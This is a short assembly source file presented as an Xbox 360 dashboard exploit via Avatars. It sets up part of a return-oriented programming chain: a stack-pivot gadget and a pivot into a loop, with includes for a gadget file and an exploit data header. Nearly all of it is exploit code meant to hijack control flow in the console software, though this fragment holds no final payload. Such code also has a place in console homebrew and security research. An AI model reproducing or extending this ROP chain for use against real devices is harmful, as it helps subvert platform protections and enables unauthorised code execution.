# Description: Exploit for the Xbox 360 dashboard using Avatars
# Author: shutterbug2000


# Compiler flags, must be set before any code or include directives:
.include "BuildConfig.asm"

# Include the header for the data segment file.
#.include "BadUpdateExploit_Data_h.asm"

# Include additional files:
.include "Gadgets.asm"

        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .long   stack_pivot                         # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: stack pivot into the loop
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
      .long   RawFileAddress + 8              # stack address for the start of the loop to pivot to
        